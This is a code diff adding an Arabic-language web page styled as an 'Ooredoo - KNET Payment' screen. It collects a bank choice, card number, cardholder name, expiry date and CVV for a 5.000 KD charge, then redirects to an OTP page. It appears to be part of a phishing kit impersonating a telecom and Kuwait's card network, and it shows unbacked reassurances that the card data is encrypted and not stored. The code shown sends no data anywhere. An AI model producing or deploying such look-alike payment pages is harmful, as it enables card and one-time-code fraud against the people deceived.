@@ -1,0 +1,500 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ooredoo - KNET Payment</title>
+    <link rel="stylesheet" href="/myooredoo/assets/css/vendors/bootstrap.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            direction: rtl;
+        }
+
+        .knet-container {
+            background: white;
+            border-radius: 15px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
+            max-width: 600px;
+            width: 100%;
+            padding: 40px;
+        }
+
+        .knet-header {
+            text-align: center;
+            margin-bottom: 40px;
+        }
+
+        .knet-header h1 {
+            color: #d41e3a;
+            font-size: 28px;
+            margin-bottom: 10px;
+        }
+
+        .knet-header p {
+            color: #666;
+            font-size: 14px;
+        }
+
+        .payment-summary {
+            background: #f5f5f5;
+            padding: 20px;
+            border-radius: 10px;
+            margin-bottom: 30px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .payment-summary-label {
+            color: #666;
+            font-size: 14px;
+        }
+
+        .payment-summary-amount {
+            color: #d41e3a;
+            font-size: 24px;
+            font-weight: bold;
+        }
+
+        .form-section {
+            margin-bottom: 30px;
+        }
+
+        .form-section h3 {
+            color: #333;
+            font-size: 16px;
+            margin-bottom: 15px;
+            font-weight: 600;
+            border-bottom: 2px solid #d41e3a;
+            padding-bottom: 10px;
+        }
+
+        .bank-selection {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+
+        .bank-option {
+            border: 2px solid #e0e0e0;
+            border-radius: 10px;
+            padding: 20px;
+            cursor: pointer;
+            transition: all 0.3s;
+            text-align: center;
+        }
+
+        .bank-option:hover {
+            border-color: #d41e3a;
+            background-color: #fff5f5;
+        }
+
+        .bank-option.selected {
+            border-color: #d41e3a;
+            background-color: #fff5f5;
+        }
+
+        .bank-option input[type="radio"] {
+            display: none;
+        }
+
+        .bank-logo {
+            font-size: 32px;
+            margin-bottom: 10px;
+        }
+
+        .bank-name {
+            font-weight: 600;
+            color: #333;
+            font-size: 14px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: #333;
+            font-size: 14px;
+        }
+
+        .form-group input,
+        .form-group select {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            font-size: 14px;
+            transition: border-color 0.3s;
+        }
+
+        .form-group input:focus,
+        .form-group select:focus {
+            outline: none;
+            border-color: #d41e3a;
+            box-shadow: 0 0 0 3px rgba(212, 30, 58, 0.1);
+        }
+
+        .form-row {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+        }
+
+        .card-preview {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 25px;
+            border-radius: 12px;
+            margin-bottom: 20px;
+            font-family: 'Courier New', monospace;
+        }
+
+        .card-number {
+            font-size: 20px;
+            letter-spacing: 2px;
+            margin-bottom: 20px;
+            word-break: break-all;
+        }
+
+        .card-info {
+            display: flex;
+            justify-content: space-between;
+            font-size: 12px;
+        }
+
+        .card-holder {
+            flex: 1;
+        }
+
+        .card-expiry {
+            text-align: center;
+        }
+
+        .card-cvv {
+            text-align: right;
+        }
+
+        .security-info {
+            background: #f0f7ff;
+            border-left: 4px solid #2196f3;
+            padding: 15px;
+            border-radius: 5px;
+            margin-bottom: 20px;
+            font-size: 12px;
+            color: #333;
+        }
+
+        .security-info strong {
+            color: #2196f3;
+        }
+
+        .button-group {
+            display: flex;
+            gap: 15px;
+            margin-top: 30px;
+        }
+
+        .btn {
+            flex: 1;
+            padding: 14px;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .btn-primary {
+            background-color: #d41e3a;
+            color: white;
+        }
+
+        .btn-primary:hover {
+            background-color: #b01830;
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(212, 30, 58, 0.3);
+        }
+
+        .btn-secondary {
+            background-color: #e0e0e0;
+            color: #333;
+        }
+
+        .btn-secondary:hover {
+            background-color: #d0d0d0;
+        }
+
+        .error-message {
+            background-color: #ffebee;
+            color: #c62828;
+            padding: 12px;
+            border-radius: 5px;
+            margin-bottom: 15px;
+            display: none;
+        }
+
+        .success-message {
+            background-color: #e8f5e9;
+            color: #2e7d32;
+            padding: 12px;
+            border-radius: 5px;
+            margin-bottom: 15px;
+            display: none;
+        }
+
+        @media (max-width: 600px) {
+            .knet-container {
+                padding: 20px;
+            }
+
+            .bank-selection {
+                grid-template-columns: 1fr;
+            }
+
+            .form-row {
+                grid-template-columns: 1fr;
+            }
+
+            .button-group {
+                flex-direction: column;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="knet-container">
+        <!-- Header -->
+        <div class="knet-header">
+            <h1>🏦 KNET Payment</h1>
+            <p>اختر بنكك وأدخل بيانات بطاقتك</p>
+        </div>
+
+        <!-- Messages -->
+        <div class="error-message" id="errorMessage"></div>
+        <div class="success-message" id="successMessage"></div>
+
+        <!-- Payment Summary -->
+        <div class="payment-summary">
+            <div class="payment-summary-label">المبلغ المستحق:</div>
+            <div class="payment-summary-amount">د.ك 5.000</div>
+        </div>
+
+        <form id="knetForm">
+            <!-- Bank Selection -->
+            <div class="form-section">
+                <h3>اختر البنك</h3>
+                <div class="bank-selection">
+                    <label class="bank-option selected">
+                        <input type="radio" name="bank" value="NBK" checked>
+                        <div class="bank-logo">🏦</div>
+                        <div class="bank-name">NBK</div>
+                    </label>
+                    <label class="bank-option">
+                        <input type="radio" name="bank" value="CBK">
+                        <div class="bank-logo">🏦</div>
+                        <div class="bank-name">CBK</div>
+                    </label>
+                    <label class="bank-option">
+                        <input type="radio" name="bank" value="FAB">
+                        <div class="bank-logo">🏦</div>
+                        <div class="bank-name">FAB</div>
+                    </label>
+                    <label class="bank-option">
+                        <input type="radio" name="bank" value="GIB">
+                        <div class="bank-logo">🏦</div>
+                        <div class="bank-name">GIB</div>
+                    </label>
+                </div>
+            </div>
+
+            <!-- Card Details -->
+            <div class="form-section">
+                <h3>بيانات البطاقة</h3>
+
+                <!-- Card Preview -->
+                <div class="card-preview">
+                    <div class="card-number" id="cardNumberDisplay">•••• •••• •••• ••••</div>
+                    <div class="card-info">
+                        <div class="card-holder">
+                            <div style="font-size: 10px; opacity: 0.8;">CARDHOLDER</div>
+                            <div id="cardHolderDisplay">YOUR NAME</div>
+                        </div>
+                        <div class="card-expiry">
+                            <div style="font-size: 10px; opacity: 0.8;">VALID THRU</div>
+                            <div id="cardExpiryDisplay">MM/YY</div>
+                        </div>
+                        <div class="card-cvv">
+                            <div style="font-size: 10px; opacity: 0.8;">CVV</div>
+                            <div id="cardCvvDisplay">•••</div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Card Number -->
+                <div class="form-group">
+                    <label>رقم البطاقة</label>
+                    <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" inputmode="numeric">
+                </div>
+
+                <!-- Cardholder Name -->
+                <div class="form-group">
+                    <label>اسم صاحب البطاقة</label>
+                    <input type="text" id="cardHolder" placeholder="أدخل اسمك كما يظهر على البطاقة">
+                </div>
+
+                <!-- Expiry and CVV -->
+                <div class="form-row">
+                    <div class="form-group">
+                        <label>تاريخ الانتهاء (MM/YY)</label>
+                        <input type="text" id="cardExpiry" placeholder="12/25" maxlength="5" inputmode="numeric">
+                    </div>
+                    <div class="form-group">
+                        <label>CVV</label>
+                        <input type="text" id="cardCvv" placeholder="123" maxlength="4" inputmode="numeric">
+                    </div>
+                </div>
+            </div>
+
+            <!-- Security Info -->
+            <div class="security-info">
+                🔒 <strong>معلومات آمنة:</strong> بيانات بطاقتك محمية بتشفير SSL 256-bit. لن نحفظ بيانات بطاقتك.
+            </div>
+
+            <!-- Buttons -->
+            <div class="button-group">
+                <button type="button" class="btn btn-secondary" onclick="goBack()">رجوع</button>
+                <button type="submit" class="btn btn-primary">متابعة إلى OTP</button>
+            </div>
+        </form>
+    </div>
+
+    <script>
+        // Format card number
+        document.getElementById('cardNumber').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\s/g, '');
+            let formattedValue = '';
+            for (let i = 0; i < value.length; i++) {
+                if (i > 0 && i % 4 === 0) {
+                    formattedValue += ' ';
+                }
+                formattedValue += value[i];
+            }
+            e.target.value = formattedValue;
+            
+            // Update preview
+            let displayValue = value.slice(-4).padStart(16, '•');
+            document.getElementById('cardNumberDisplay').textContent = displayValue.slice(0, 4) + ' ' + displayValue.slice(4, 8) + ' ' + displayValue.slice(8, 12) + ' ' + displayValue.slice(12);
+        });
+
+        // Update cardholder name
+        document.getElementById('cardHolder').addEventListener('input', function(e) {
+            document.getElementById('cardHolderDisplay').textContent = e.target.value || 'YOUR NAME';
+        });
+
+        // Format expiry date
+        document.getElementById('cardExpiry').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length >= 2) {
+                value = value.slice(0, 2) + '/' + value.slice(2, 4);
+            }
+            e.target.value = value;
+            document.getElementById('cardExpiryDisplay').textContent = value || 'MM/YY';
+        });
+
+        // Update CVV
+        document.getElementById('cardCvv').addEventListener('input', function(e) {
+            document.getElementById('cardCvvDisplay').textContent = '•'.repeat(e.target.value.length) || '•••';
+        });
+
+        // Bank selection styling
+        document.querySelectorAll('.bank-option input').forEach(radio => {
+            radio.addEventListener('change', function() {
+                document.querySelectorAll('.bank-option').forEach(option => {
+                    option.classList.remove('selected');
+                });
+                this.parentElement.classList.add('selected');
+            });
+        });
+
+        // Form submission
+        document.getElementById('knetForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
+            const cardHolder = document.getElementById('cardHolder').value;
+            const cardExpiry = document.getElementById('cardExpiry').value;
+            const cardCvv = document.getElementById('cardCvv').value;
+            const bank = document.querySelector('input[name="bank"]:checked').value;
+
+            // Validation
+            if (!cardNumber || cardNumber.length !== 16) {
+                showError('رقم البطاقة غير صحيح');
+                return;
+            }
+            if (!cardHolder) {
+                showError('أدخل اسم صاحب البطاقة');
+                return;
+            }
+            if (!cardExpiry || cardExpiry.length !== 5) {
+                showError('تاريخ الانتهاء غير صحيح');
+                return;
+            }
+            if (!cardCvv || cardCvv.length < 3) {
+                showError('CVV غير صحيح');
+                return;
+            }
+
+            // Save to session and redirect
+            sessionStorage.setItem('knetData', JSON.stringify({
+                bank: bank,
+                cardHolder: cardHolder,
+                cardExpiry: cardExpiry,
+                lastFourDigits: cardNumber.slice(-4)
+            }));
+
+            showSuccess('تم التحقق من البيانات بنجاح');
+            setTimeout(() => {
+                window.location.href = '/myooredoo/otp.html';
+            }, 1500);
+        });
+
+        function showError(message) {
+            const errorEl = document.getElementById('errorMessage');
+            errorEl.textContent = message;
+            errorEl.style.display = 'block';
+            setTimeout(() => {
+                errorEl.style.display = 'none';
+            }, 5000);
+        }
+
+        function showSuccess(message) {
+            const successEl = document.getElementById('successMessage');
+            successEl.textContent = message;
+            successEl.style.display = 'block';
+        }
+
+        function goBack() {
+            window.location.href = '/myooredoo/';
+        }
+    </script>
+</body>
+</html>
